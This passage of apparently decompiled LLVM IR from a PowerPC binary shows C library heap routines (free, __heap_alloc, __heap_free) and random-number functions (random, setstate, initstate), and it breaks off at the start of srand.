  %v0_100107d4 = phi i32 [ %v1_100107b4, %dec_label_pc_100107b8 ], [ 0, %dec_label_pc_100107c0 ]
  store i32 %v0_100107d4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100107d4

; uselistorder directives
  uselistorder i32 %v0_100107d4, { 1, 0 }
  uselistorder i32 %v1_100107b4, { 1, 0, 2 }
  uselistorder i32 %v1_1001073c, { 1, 0, 2 }
  uselistorder i32 %v1_1001072c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_100106f8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_100106dc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 15, 16, 3, 5, 4, 6, 17, 7, 18, 8, 19, 10, 9, 20, 11, 12, 13, 14, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10030e38.637 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100107d0, { 1, 0 }
  uselistorder label %dec_label_pc_100107c0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10010750, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010718, { 1, 0 }
  uselistorder label %dec_label_pc_100106ac, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100107e8 = icmp eq i32 %arg1, 0
  br i1 %v3_100107e8, label %dec_label_pc_100108d4, label %dec_label_pc_10010800

dec_label_pc_10010800:                            ; preds = %entry
  %v1_10010804 = add i32 %arg1, -4
  %v2_10010804 = inttoptr i32 %v1_10010804 to i32*
  %v3_10010804 = load i32, i32* %v2_10010804, align 4
  store i32 %v3_10010804, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r26, align 4
  %v0_10010818 = call i32 @__pthread_return_0()
  %v0_10010820 = load i32, i32* @r28, align 4
  store i32 268503084, i32* @lr, align 4
  %v4_10010828 = call i32 @__heap_free(i32* nonnull @global_var_1002ab98, i32 %v1_10010804, i32 %v0_10010820)
  %v3_10010830 = load i32, i32* @global_var_1002abf8.640, align 4
  store i32 %v4_10010828, i32* @r29, align 4
  %v1_10010838 = inttoptr i32 %v4_10010828 to i32*
  %v2_10010838 = load i32, i32* %v1_10010838, align 4
  store i32 %v2_10010838, i32* @r27, align 4
  %v1_1001083c = mul i32 %v3_10010830, 8
  %v2_10010840 = icmp ult i32 %v2_10010838, %v1_1001083c
  br i1 %v2_10010840, label %dec_label_pc_10010874, label %dec_label_pc_10010848

dec_label_pc_10010848:                            ; preds = %dec_label_pc_10010800
  store i32 ptrtoint (i32* @global_var_10030ee8.641 to i32), i32* @r28, align 4
  %v0_10010858 = call i32 @__pthread_return_0()
  store i32 268503140, i32* @lr, align 4
  %v1_10010860 = call i32 @__GI_sbrk(i32 0)
  %v0_10010864 = load i32, i32* @r31, align 4
  %v4_10010864 = icmp eq i32 %v0_10010864, %v1_10010860
  br i1 %v4_10010864, label %dec_label_pc_1001087c, label %dec_label_pc_1001086c

dec_label_pc_1001086c:                            ; preds = %dec_label_pc_10010848
  %v0_10010870 = call i32 @__pthread_return_0()
  br label %dec_label_pc_10010874

dec_label_pc_10010874:                            ; preds = %dec_label_pc_10010800, %dec_label_pc_1001086c
  br label %dec_label_pc_100108d0

dec_label_pc_1001087c:                            ; preds = %dec_label_pc_10010848
  %v0_1001087c = load i32, i32* @r29, align 4
  %v1_1001087c = add i32 %v0_1001087c, 4
  %v2_1001087c = inttoptr i32 %v1_1001087c to i32*
  %v3_1001087c = load i32, i32* %v2_1001087c, align 4
  %v3_10010880 = icmp eq i32 %v3_1001087c, 0
  br i1 %v3_10010880, label %dec_label_pc_10010890, label %dec_label_pc_10010888

dec_label_pc_10010888:                            ; preds = %dec_label_pc_1001087c
  %v1_10010888 = add i32 %v0_1001087c, 8
  %v2_10010888 = inttoptr i32 %v1_10010888 to i32*
  %v3_10010888 = load i32, i32* %v2_10010888, align 4
  %v2_1001088c = add i32 %v3_1001087c, 8
  %v3_1001088c = inttoptr i32 %v2_1001088c to i32*
  store i32 %v3_10010888, i32* %v3_1001088c, align 4
  %v0_10010890.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010890

dec_label_pc_10010890:                            ; preds = %dec_label_pc_1001087c, %dec_label_pc_10010888
  %v0_10010890 = phi i32 [ %v0_1001087c, %dec_label_pc_1001087c ], [ %v0_10010890.pre, %dec_label_pc_10010888 ]
  %v1_10010890 = add i32 %v0_10010890, 8
  %v2_10010890 = inttoptr i32 %v1_10010890 to i32*
  %v3_10010890 = load i32, i32* %v2_10010890, align 4
  %v1_10010894 = add i32 %v0_10010890, 4
  %v2_10010894 = inttoptr i32 %v1_10010894 to i32*
  %v3_10010894 = load i32, i32* %v2_10010894, align 4
  %v3_10010898 = icmp eq i32 %v3_10010890, 0
  br i1 %v3_10010898, label %dec_label_pc_100108a8, label %dec_label_pc_100108a0

dec_label_pc_100108a0:                            ; preds = %dec_label_pc_10010890
  %v2_100108a0 = add i32 %v3_10010890, 4
  %v3_100108a0 = inttoptr i32 %v2_100108a0 to i32*
  store i32 %v3_10010894, i32* %v3_100108a0, align 4
  br label %dec_label_pc_100108ac

dec_label_pc_100108a8:                            ; preds = %dec_label_pc_10010890
  store i32 %v3_10010894, i32* @global_var_1002ab98, align 4
  br label %dec_label_pc_100108ac

dec_label_pc_100108ac:                            ; preds = %dec_label_pc_100108a0, %dec_label_pc_100108a8
  %v0_100108b4 = call i32 @__pthread_return_0()
  %v0_100108b8 = load i32, i32* @r27, align 4
  %v1_100108b8 = load i32, i32* @r29, align 4
  %v0_100108c0 = load i32, i32* @r31, align 4
  %v2_100108b8 = sub i32 12, %v0_100108b8
  %v1_100108bc = add i32 %v2_100108b8, %v1_100108b8
  %v2_100108c0 = sub i32 %v1_100108bc, %v0_100108c0
  store i32 268503240, i32* @lr, align 4
  %v1_100108c4 = call i32 @__GI_sbrk(i32 %v2_100108c0)
  br label %dec_label_pc_100108d0

dec_label_pc_100108d0:                            ; preds = %dec_label_pc_10010874, %dec_label_pc_100108ac
  %v0_100108d0 = call i32 @__pthread_return_0()
  br label %dec_label_pc_100108d4

dec_label_pc_100108d4:                            ; preds = %entry, %dec_label_pc_100108d0
  %v0_100108e4 = phi i32 [ 0, %entry ], [ %v0_100108d0, %dec_label_pc_100108d0 ]
  ret i32 %v0_100108e4

; uselistorder directives
  uselistorder i32 %v0_10010890, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1002ab98, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100108d4, { 1, 0 }
  uselistorder label %dec_label_pc_100108d0, { 1, 0 }
  uselistorder label %dec_label_pc_100108ac, { 1, 0 }
  uselistorder label %dec_label_pc_10010890, { 1, 0 }
  uselistorder label %dec_label_pc_10010874, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_100108e8 = inttoptr i32 %arg2 to i32*
  %v2_100108e8 = load i32, i32* %v1_100108e8, align 4
  %v1_100108ec = add i32 %v2_100108e8, 3
  store i32 %v1_100108ec, i32* %r9.global-to-local, align 4
  %v1_100108f0 = call i32 @__asm_rlwinm(i32 %v1_100108ec, i32 0, i32 0, i32 29)
  %v2_100108f4 = icmp ugt i32 %v1_100108f0, 11
  br i1 %v2_100108f4, label %dec_label_pc_10010978.preheader, label %dec_label_pc_100108fc

dec_label_pc_100108fc:                            ; preds = %entry
  br label %dec_label_pc_10010978.preheader

dec_label_pc_10010978.preheader:                  ; preds = %entry, %dec_label_pc_100108fc
  %storemerge20 = phi i32 [ 12, %dec_label_pc_100108fc ], [ %v1_100108f0, %entry ]
  %v0_1001095c = phi i32 [ 12, %dec_label_pc_100108fc ], [ %v1_100108f0, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_100109785 = icmp eq i32 %storemerge2, 0
  br i1 %v3_100109785, label %dec_label_pc_10010980, label %dec_label_pc_10010908

dec_label_pc_10010908:                            ; preds = %dec_label_pc_10010978.preheader, %dec_label_pc_10010974
  %v0_10010974 = phi i32 [ %storemerge, %dec_label_pc_10010974 ], [ %storemerge2, %dec_label_pc_10010978.preheader ]
  %v1_10010908 = inttoptr i32 %v0_10010974 to i32*
  %v2_10010908 = load i32, i32* %v1_10010908, align 4
  store i32 %v2_10010908, i32* %r10.global-to-local, align 4
  %v2_1001090c = icmp ult i32 %v2_10010908, %v0_1001095c
  br i1 %v2_1001090c, label %dec_label_pc_10010974, label %dec_label_pc_10010914

dec_label_pc_10010914:                            ; preds = %dec_label_pc_10010908
  %v1_10010914 = add i32 %v0_1001095c, 44
  %v2_10010918 = icmp ult i32 %v2_10010908, %v1_10010914
  br i1 %v2_10010918, label %dec_label_pc_10010920, label %dec_label_pc_1001095c

dec_label_pc_10010920:                            ; preds = %dec_label_pc_10010914
  %v1_10010920 = add i32 %v0_10010974, 4
  %v2_10010920 = inttoptr i32 %v1_10010920 to i32*
  %v3_10010920 = load i32, i32* %v2_10010920, align 4
  store i32 %v3_10010920, i32* %r11.global-to-local, align 4
  %v3_10010924 = icmp eq i32 %v3_10010920, 0
  br i1 %v3_10010924, label %dec_label_pc_10010934, label %dec_label_pc_1001092c

dec_label_pc_1001092c:                            ; preds = %dec_label_pc_10010920
  %v1_1001092c = add i32 %v0_10010974, 8
  %v2_1001092c = inttoptr i32 %v1_1001092c to i32*
  %v3_1001092c = load i32, i32* %v2_1001092c, align 4
  %v2_10010930 = add i32 %v3_10010920, 8
  %v3_10010930 = inttoptr i32 %v2_10010930 to i32*
  store i32 %v3_1001092c, i32* %v3_10010930, align 4
  %v0_10010934.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10010950.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010934

dec_label_pc_10010934:                            ; preds = %dec_label_pc_10010920, %dec_label_pc_1001092c
  %v0_10010950 = phi i32 [ %v2_10010908, %dec_label_pc_10010920 ], [ %v0_10010950.pre, %dec_label_pc_1001092c ]
  %v0_10010934 = phi i32 [ %v0_10010974, %dec_label_pc_10010920 ], [ %v0_10010934.pre, %dec_label_pc_1001092c ]
  %v1_10010934 = add i32 %v0_10010934, 8
  %v2_10010934 = inttoptr i32 %v1_10010934 to i32*
  %v3_10010934 = load i32, i32* %v2_10010934, align 4
  %v1_10010938 = add i32 %v0_10010934, 4
  %v2_10010938 = inttoptr i32 %v1_10010938 to i32*
  %v3_10010938 = load i32, i32* %v2_10010938, align 4
  %v3_1001093c = icmp eq i32 %v3_10010934, 0
  store i32 %v0_10010950, i32* %r11.global-to-local, align 4
  br i1 %v3_1001093c, label %dec_label_pc_10010950, label %dec_label_pc_10010944

dec_label_pc_10010944:                            ; preds = %dec_label_pc_10010934
  %v2_10010948 = add i32 %v3_10010934, 4
  %v3_10010948 = inttoptr i32 %v2_10010948 to i32*
  store i32 %v3_10010938, i32* %v3_10010948, align 4
  br label %dec_label_pc_10010964

dec_label_pc_10010950:                            ; preds = %dec_label_pc_10010934
  store i32 %v3_10010938, i32* %arg1, align 4
  br label %dec_label_pc_10010964

dec_label_pc_1001095c:                            ; preds = %dec_label_pc_10010914
  %v2_1001095c = sub i32 %v2_10010908, %v0_1001095c
  store i32 %v2_1001095c, i32* %v1_10010908, align 4
  br label %dec_label_pc_10010964

dec_label_pc_10010964:                            ; preds = %dec_label_pc_10010950, %dec_label_pc_10010944, %dec_label_pc_1001095c
  %v0_10010964 = load i32, i32* %r10.global-to-local, align 4
  %v1_10010964 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010964 = sub i32 %v1_10010964, %v0_10010964
  store i32 %v2_10010964, i32* %r9.global-to-local, align 4
  %v0_10010968 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010968, i32* %v1_100108e8, align 4
  %v0_1001096c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001096c = add i32 %v0_1001096c, 12
  ret i32 %v1_1001096c

dec_label_pc_10010974:                            ; preds = %dec_label_pc_10010908
  %v1_10010974 = add i32 %v0_10010974, 4
  %storemerge.in = inttoptr i32 %v1_10010974 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10010978 = icmp eq i32 %storemerge, 0
  br i1 %v3_10010978, label %dec_label_pc_10010978.dec_label_pc_10010980_crit_edge, label %dec_label_pc_10010908

dec_label_pc_10010978.dec_label_pc_10010980_crit_edge: ; preds = %dec_label_pc_10010974
  br label %dec_label_pc_10010980

dec_label_pc_10010980:                            ; preds = %dec_label_pc_10010978.dec_label_pc_10010980_crit_edge, %dec_label_pc_10010978.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10010934, { 1, 0 }
  uselistorder i32 %v2_10010908, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10010974, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1001095c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10010964, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010934, { 1, 0 }
  uselistorder label %dec_label_pc_10010908, { 1, 0 }
  uselistorder label %dec_label_pc_10010978.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10010988 = icmp eq i32 %arg3, 0
  %v2_1001098c = add i32 %arg2, 4
  %v3_1001098c = inttoptr i32 %v2_1001098c to i32*
  store i32 %arg4, i32* %v3_1001098c, align 4
  %v2_10010990 = add i32 %arg2, 8
  %v3_10010990 = inttoptr i32 %v2_10010990 to i32*
  store i32 %arg3, i32* %v3_10010990, align 4
  br i1 %v3_10010988, label %dec_label_pc_100109a0, label %dec_label_pc_10010998

dec_label_pc_10010998:                            ; preds = %entry
  %v2_10010998 = add i32 %arg3, 4
  %v3_10010998 = inttoptr i32 %v2_10010998 to i32*
  store i32 %arg2, i32* %v3_10010998, align 4
  br label %dec_label_pc_100109a4

dec_label_pc_100109a0:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_10010998, %dec_label_pc_100109a0
  %v3_100109a4 = icmp eq i32 %arg4, 0
  %v0_100109a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100109a4, i32 %v0_100109a8)
  %v2_100109ac = add i32 %arg4, 8
  %v3_100109ac = inttoptr i32 %v2_100109ac to i32*
  store i32 %arg2, i32* %v3_100109ac, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_100109a4, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_100109b4 = icmp eq i32 %arg3, 0
  br i1 %v3_100109b4, label %dec_label_pc_100109c4, label %dec_label_pc_100109bc

dec_label_pc_100109bc:                            ; preds = %entry
  %v2_100109bc = add i32 %arg3, 4
  %v3_100109bc = inttoptr i32 %v2_100109bc to i32*
  store i32 %arg2, i32* %v3_100109bc, align 4
  br label %dec_label_pc_100109c8

dec_label_pc_100109c4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100109c8

dec_label_pc_100109c8:                            ; preds = %dec_label_pc_100109bc, %dec_label_pc_100109c4
  %v2_100109c8 = add i32 %arg2, 8
  %v3_100109c8 = inttoptr i32 %v2_100109c8 to i32*
  store i32 %arg3, i32* %v3_100109c8, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100109c8, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100109e8 = load i32, i32* %arg1, align 4
  store i32 %v2_100109e8, i32* @r31, align 4
  %v2_100109ec = add i32 %arg3, %arg2
  store i32 %v2_100109ec, i32* %r3.global-to-local, align 4
  %v3_10010a007 = icmp eq i32 %v2_100109e8, 0
  %v1_10010a048 = add i32 %v2_100109e8, 12
  %tmp69 = icmp uge i32 %v1_10010a048, %arg2
  %or.cond10 = or i1 %v3_10010a007, %tmp69
  br i1 %or.cond10, label %dec_label_pc_10010a10, label %dec_label_pc_100109f8

dec_label_pc_100109f8:                            ; preds = %entry, %dec_label_pc_100109f8
  %v0_10010a5811 = phi i32 [ %v3_100109fc, %dec_label_pc_100109f8 ], [ %v2_100109e8, %entry ]
  store i32 %v0_10010a5811, i32* %r11.global-to-local, align 4
  %v1_100109fc = add i32 %v0_10010a5811, 4
  %v2_100109fc = inttoptr i32 %v1_100109fc to i32*
  %v3_100109fc = load i32, i32* %v2_100109fc, align 4
  store i32 %v3_100109fc, i32* @r31, align 4
  %v3_10010a00 = icmp eq i32 %v3_100109fc, 0
  %v1_10010a04 = add i32 %v3_100109fc, 12
  %tmp6 = icmp uge i32 %v1_10010a04, %arg2
  %or.cond = or i1 %v3_10010a00, %tmp6
  br i1 %or.cond, label %dec_label_pc_10010a10, label %dec_label_pc_100109f8

dec_label_pc_10010a10:                            ; preds = %dec_label_pc_100109f8, %entry
  %v0_10010a4c.lcssa = phi i32 [ 0, %entry ], [ %v0_10010a5811, %dec_label_pc_100109f8 ]
  %v0_10010a58.lcssa = phi i32 [ %v2_100109e8, %entry ], [ %v3_100109fc, %dec_label_pc_100109f8 ]
  %v3_10010a00.lcssa = phi i1 [ %v3_10010a007, %entry ], [ %v3_10010a00, %dec_label_pc_100109f8 ]
  br i1 %v3_10010a00.lcssa, label %dec_label_pc_10010ac8, label %dec_label_pc_10010a18

dec_label_pc_10010a18:                            ; preds = %dec_label_pc_10010a10
  %v1_10010a18 = inttoptr i32 %v0_10010a58.lcssa to i32*
  %v2_10010a18 = load i32, i32* %v1_10010a18, align 4
  %v2_10010a1c = sub i32 %v0_10010a58.lcssa, %v2_10010a18
  %v1_10010a20 = add i32 %v2_10010a1c, 12
  %v3_10010a24 = icmp ugt i32 %v1_10010a20, %v2_100109ec
  br i1 %v3_10010a24, label %dec_label_pc_10010ac8, label %dec_label_pc_10010a2c

dec_label_pc_10010a2c:                            ; preds = %dec_label_pc_10010a18
  %v4_10010a24 = icmp eq i32 %v1_10010a20, %v2_100109ec
  %v2_10010a30 = add i32 %v2_10010a18, %arg3
  store i32 %v2_10010a30, i32* @r29, align 4
  br i1 %v4_10010a24, label %dec_label_pc_10010a38, label %dec_label_pc_10010a68

dec_label_pc_10010a38:                            ; preds = %dec_label_pc_10010a2c
  %v3_10010a38 = icmp eq i32 %v0_10010a4c.lcssa, 0
  br i1 %v3_10010a38, label %dec_label_pc_10010abc, label %dec_label_pc_10010a40

dec_label_pc_10010a40:                            ; preds = %dec_label_pc_10010a38
  %v1_10010a40 = add i32 %v0_10010a4c.lcssa, 12
  %v4_10010a44 = icmp eq i32 %v1_10010a40, %arg2
  br i1 %v4_10010a44, label %dec_label_pc_10010a4c, label %dec_label_pc_10010abc

dec_label_pc_10010a4c:                            ; preds = %dec_label_pc_10010a40
  %v1_10010a4c = inttoptr i32 %v0_10010a4c.lcssa to i32*
  %v2_10010a4c = load i32, i32* %v1_10010a4c, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10010a54 = add i32 %v0_10010a4c.lcssa, 8
  %v2_10010a54 = inttoptr i32 %v1_10010a54 to i32*
  %v3_10010a54 = load i32, i32* %v2_10010a54, align 4
  %v2_10010a5c = add i32 %v2_10010a4c, %v2_10010a30
  store i32 %v2_10010a5c, i32* @r29, align 4
  %v5_10010a60 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_10010a58.lcssa, i32 %v3_10010a54, i32 %v2_100109ec)
  store i32 %v5_10010a60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010abc

dec_label_pc_10010a68:                            ; preds = %dec_label_pc_10010a2c
  %v1_10010a68 = add i32 %v0_10010a58.lcssa, 4
  %v2_10010a68 = inttoptr i32 %v1_10010a68 to i32*
  %v3_10010a68 = load i32, i32* %v2_10010a68, align 4
  %v3_10010a6c = icmp eq i32 %v3_10010a68, 0
  br i1 %v3_10010a6c, label %dec_label_pc_10010aa4, label %dec_label_pc_10010a74

dec_label_pc_10010a74:                            ; preds = %dec_label_pc_10010a68
  %v1_10010a74 = inttoptr i32 %v3_10010a68 to i32*
  %v2_10010a74 = load i32, i32* %v1_10010a74, align 4
  %v2_10010a78 = sub i32 %v3_10010a68, %v2_10010a74
  %v1_10010a7c = add i32 %v2_10010a78, 12
  %v4_10010a80 = icmp eq i32 %v2_100109ec, %v1_10010a7c
  br i1 %v4_10010a80, label %dec_label_pc_10010a88, label %dec_label_pc_10010aa4

dec_label_pc_10010a88:                            ; preds = %dec_label_pc_10010a74
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10010a94 = add i32 %v2_10010a74, %v2_10010a30
  store i32 %v2_10010a94, i32* @r29, align 4
  store i32 %v3_10010a68, i32* @r31, align 4
  %v5_10010a9c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_10010a68, i32 %v0_10010a4c.lcssa, i32 %v2_100109ec)
  store i32 %v5_10010a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010abc

dec_label_pc_10010aa4:                            ; preds = %dec_label_pc_10010a74, %dec_label_pc_10010a68
  %v2_10010aa4 = add i32 %v0_10010a58.lcssa, %arg3
  store i32 %v2_10010aa4, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268503740, i32* @lr, align 4
  %v5_10010ab8 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_10010aa4, i32 %v0_10010a4c.lcssa, i32 %v3_10010a68)
  store i32 %v5_10010ab8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010abc

dec_label_pc_10010abc:                            ; preds = %dec_label_pc_10010a40, %dec_label_pc_10010a38, %dec_label_pc_10010a88, %dec_label_pc_10010a4c, %dec_label_pc_10010aa4
  %v0_10010abc = load i32, i32* @r31, align 4
  store i32 %v0_10010abc, i32* @r30, align 4
  %v0_10010ac0 = load i32, i32* @r29, align 4
  %v2_10010ac0 = inttoptr i32 %v0_10010abc to i32*
  store i32 %v0_10010ac0, i32* %v2_10010ac0, align 4
  br label %dec_label_pc_10010ae4

dec_label_pc_10010ac8:                            ; preds = %dec_label_pc_10010a18, %dec_label_pc_10010a10
  %v2_10010ac8 = add i32 %v2_100109ec, -12
  %v3_10010ac8 = inttoptr i32 %v2_10010ac8 to i32*
  store i32 %arg3, i32* %v3_10010ac8, align 4
  %v0_10010acc = load i32, i32* %r3.global-to-local, align 4
  %v1_10010acc = add i32 %v0_10010acc, -12
  store i32 %v1_10010acc, i32* @r30, align 4
  %v0_10010ad0 = load i32, i32* %r11.global-to-local, align 4
  %v0_10010ad4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10010ad4, i32* %r3.global-to-local, align 4
  %v0_10010ad8 = load i32, i32* @r31, align 4
  store i32 268503780, i32* @lr, align 4
  %v4_10010ae0 = inttoptr i32 %v0_10010ad4 to i32*
  %v5_10010ae0 = call i32 @__heap_link_free_area(i32* %v4_10010ae0, i32 %v1_10010acc, i32 %v0_10010ad0, i32 %v0_10010ad8)
  store i32 %v5_10010ae0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010ae4

dec_label_pc_10010ae4:                            ; preds = %dec_label_pc_10010abc, %dec_label_pc_10010ac8
  %v0_10010ae8 = load i32, i32* @r30, align 4
  store i32 %v0_10010ae8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010ae8

; uselistorder directives
  uselistorder i32 %v3_10010a68, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10010a20, { 1, 0 }
  uselistorder i32 %v0_10010a58.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10010a4c.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_100109fc, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_100109ec, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10010ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10010abc, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100109f8, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_10010afc = call i32 @random()
  ret i32 %v0_10010afc

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10010b14 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002aa58.646 to i32), i32* @r29, align 4
  store i32 %v2_10010b14, i32* @r3, align 4
  %v0_10010b2c = call i32 @__pthread_return_void()
  %v0_10010b34 = call i32 @__pthread_return_0()
  %v2_10010b3c = ptrtoint i32* %stack_var_-56 to i32
  %v3_10010b44 = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21904) to i32*), i32 %v2_10010b3c)
  store i32 %v2_10010b14, i32* @r3, align 4
  %v0_10010b50 = call i32 @__pthread_return_void()
  %v3_10010b58 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10010b58
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002aa58.646 to i32), i32* %r29.global-to-local, align 4
  %v2_10010b90 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010b90, i32* @r3, align 4
  %v0_10010b98 = call i32 @__pthread_return_void()
  %v0_10010ba0 = call i32 @__pthread_return_0()
  store i32 268503996, i32* @lr, align 4
  %v3_10010bb8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002aa70)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10010bc0 = icmp slt i32 %v3_10010bb8, 0
  store i32 %v2_10010b90, i32* @r3, align 4
  br i1 %v1_10010bc0, label %dec_label_pc_10010bd4, label %dec_label_pc_10010bd0

dec_label_pc_10010bd0:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002aa74.650 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10010bd4

dec_label_pc_10010bd4:                            ; preds = %entry, %dec_label_pc_10010bd0
  %v0_10010bd4 = call i32 @__pthread_return_void()
  %v0_10010bdc = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10010bdc

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10010bd4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_10010c00 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10010c00, i32* @r3, align 4
  %v0_10010c28 = call i32 @__pthread_return_void()
  %v0_10010c30 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268504144, i32* @lr, align 4
  %v4_10010c4c = inttoptr i32 %arg1 to i32*
  %v5_10010c4c = call i32 @__GI_initstate_r(i32* %v4_10010c4c, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002aa70 to i32))
  store i32 %v2_10010c00, i32* @r3, align 4
  %v0_10010c58 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1002aa74.650 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
